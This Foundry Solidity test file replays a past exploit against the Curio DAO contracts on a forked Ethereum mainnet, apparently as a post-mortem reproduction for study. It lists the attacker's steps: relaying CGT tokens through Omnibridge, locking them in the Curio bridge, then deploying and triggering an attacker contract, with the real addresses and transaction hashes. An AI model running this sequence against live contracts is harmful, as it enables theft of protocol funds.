// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import "./AttackerContract.sol";
import "./Interfaces.sol";
import "./ds-contracts/vat.sol";
import "./ds-contracts/join.sol";
import "./ds-contracts/Chief/chief.sol";

contract Exploit_Curio is TestHarness, TokenBalanceTracker {
    // Instances of tokens involved
    IDSToken cgtToken = IDSToken(0xF56b164efd3CFc02BA739b719B6526A6FA1cA32a);
    IMERC20 curioCSCToken = IMERC20(0xfDcdfA378818AC358739621ddFa8582E6ac1aDcB);

    // Instances of relevant contracts
    Action attackerContract;
    DSChief chief;
    DSPause pause;
    Vat vat;
    DaiJoin daiJoin;
    IMERC20 IOU;

    // Peripheral contracts
    IForeignOmnibridge foreignOmniBridge = IForeignOmnibridge(0x69c707d975e8d883920003CC357E556a4732CD03);
    ICurioBridge curioBridge = ICurioBridge(0x9b8A09b3f538666479a66888441E15DDE8d13412);

    address ATTACKER = makeAddr("ATTACKER");

    function setUp() external {
        // Attack tx: 0x4ff4028b03c3df468197358b99f5160e5709e7fce3884cc8ce818856d058e106

        // Create a fork right before the attack started
        cheat.createSelectFork("mainnet", 19_498_910);

        // Setup attackers account
        deal(address(cgtToken), ATTACKER, 100 ether);

        // Initialize labels and token tracker
        _labelAccounts();
        _tokenTrackerSetup();
    }

    function test_attack() public {
        console.log("\n==== STEP 0: Instance protocol contracts ====");
        // These contracts were deployed almost 3 years before the attack by Curio
        _instanceCurioContracts();

        console.log("\n==== STEP 1: Send tokens to Omnibridge ====");
        // Approve tx: 0x0b4a076b4fe1d873b75e7fadc3d99e0240a61fa23f5327782416588f09c32295
        // Relay tx: 0xf653d1d9c18bf0be78c5b7a2c58c9286bf02fd2b4c8d2106180929526b7fc151
        cheat.startPrank(ATTACKER);
        cgtToken.approve(address(foreignOmniBridge), 10 ether);
        foreignOmniBridge.relayTokens(address(cgtToken), 10 ether);
        console.log("Relay successful");
        cheat.stopPrank();

        console.log("\n==== STEP 2: Lock tokens to Curio Bridge ====");
        // Approve tx: 0x08e5c70d3407acec5cb85ff064e5fe029eca191d16966d1aaac6613702a0c6ce
        // Lock tx: 0xf653d1d9c18bf0be78c5b7a2c58c9286bf02fd2b4c8d2106180929526b7fc151
        cheat.startPrank(ATTACKER);
        cgtToken.approve(address(curioBridge), 10 ether);
        curioBridge.lock(bytes32(0), address(cgtToken), 10 ether);
        // we pass an arb to address on Curio Parachain
        console.log("Lock successful");
        cheat.stopPrank();

        console.log("\n==== STEP 3: Deploy Attacker's contract (called Action) ====");
        // Deploy tx: 0x99cc992de6e42a0817713489aeeb21f2d5e5fdca1f833826be09a9f35e5654e3
        cheat.prank(ATTACKER);
        attackerContract = new Action();
        require(address(attackerContract).code.length != 0, "Attacker's contract deployment failed");
        console.log("Attacker's contract deployement successful");

        console.log("\n==== STEP 4: Call cook() on Action, start attack ====");
        cheat.startPrank(ATTACKER);
        cgtToken.approve(address(attackerContract), 2 ether); // 0x6a4cb2aa03ebf35f25e9f34a1727f7e0ea34c5e59cebc85b9e9c0729c6b0ad59
        attackerContract.cook(address(cgtToken), 2 ether, 10 ether, 10 ether);
        cheat.stopPrank();
        // the last two params were set to some arbitrary-like values but are unused in the call.
        // Just for profit checks:
        /*
            require(weth.balanceOf(address(this)) >= wethMin, "not enought weth");
            require(dai.balanceOf(address(this)) >= daiMin, "not enought dai");
        */

        /*
        // Next steps:
        1. Mint CGT tokens via executor's contract
        2. Evaluate if the other previous calls that only emit events (likely changing only some attacker's
        contract storage) are necessary
        */
    }

    function _instanceCurioContracts() internal {
        // CSC Curio Token deployer: 0x63eA2D3fCb0759Ab9aD46eDc5269D7DebD0BDbe6

        // IOU deployment: 0x8b8ef358b5407298bc7e77e77575993a3f559b4f343e26f1c5cf721e6922cf46
        IOU = IMERC20(0xD29CAB1a24fC9fa22a035A7c3a0bF54a7cE7598D);

        // Chief deployment: 0x83661c0bb2d1288c523aba5aaa9f78d237eb6d068f5374ce221c38b0c088c598
        chief = DSChief(0x579A3244f38112b8AAbefcE0227555C9b6e7aaF0);

        // Pause deployment: 0x5629b47d48a6af2956ce0ab966c8aa7a7fb99d6d1ebfa17d359f129b00b60aa2
        pause = DSPause(0x1e692eF9cF786Ed4534d5Ca11EdBa7709602c69f);

        // Vat deployment: 0x5fcb57eb4326220c3c0ae53cd78defed530a8cd4dddde28a45c4c7cd9a06b5f2
        vat = Vat(0x8B2B0c101adB9C3654B226A3273e256a74688E57);

        // DaiJoin deployment: 0xb467409f36f03fd0328e49858bfbd662b15a362fd932ed8c3e20892bba39229f
        daiJoin = DaiJoin(0xE35Fc6305984a6811BD832B0d7A2E6694e37dfaF);
    }

    function _labelAccounts() internal {
        cheat.label(ATTACKER, "Attacker");

        cheat.label(address(foreignOmniBridge), "ForeignOmniBridge");
        cheat.label(address(cgtToken), "CGT Token");
        cheat.label(address(curioCSCToken), "CSC Token");
    }

    function _tokenTrackerSetup() internal {
        // Add relevant tokens to tracker

        // Initialize user's state
        updateBalanceTracker(address(this));
    }
}
